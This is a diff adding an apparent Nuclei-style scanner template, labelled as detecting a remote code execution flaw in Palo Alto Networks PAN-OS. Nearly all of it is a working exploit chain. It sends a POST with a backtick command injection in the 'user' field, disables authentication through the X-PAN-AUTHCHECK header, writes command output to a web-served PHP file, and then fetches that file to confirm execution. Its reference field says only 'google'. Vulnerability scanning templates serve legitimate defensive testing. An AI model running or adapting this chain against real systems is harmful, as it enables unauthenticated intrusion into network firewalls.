@@ -1,0 +1,63 @@
+id: panos-remote-code-execution
+
+info:
+  name: Palo Alto Networks PAN-OS Remote Code Execution
+  author: Betmen-N-Dgeng
+  severity: critical
+  description: |
+    Detects a remote code execution vulnerability in Palo Alto Networks PAN-OS via the `createRemoteAppwebSession.php` endpoint.
+  reference:
+    - google
+  tags: rce, panos, paloalto
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/php/utils/createRemoteAppwebSession.php/watchTowr.js.map"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+      X-PAN-AUTHCHECK: "off"
+      Connection: "close"
+    body: "user=`echo $(id) > /var/appweb/htdocs/unauth/{{randstr}}.php`&userRole=superuser&remoteHost=&vsys=vsys1"
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie"
+        condition: and
+      - type: word
+        part: header
+        words:
+          - "PHPSESSID="
+        condition: and
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/.js.map"
+    headers:
+      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+      X-PAN-AUTHCHECK: "off"
+      Connection: "close"
+    cookies:
+      PHPSESSID: "{{PHPSESSID}}"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/unauth/{{randstr}}.php"
+    headers:
+      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+      X-PAN-AUTHCHECK: "off"
+      Connection: "close"
+    cookies:
+      PHPSESSID: "{{PHPSESSID}}"
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+        condition: or
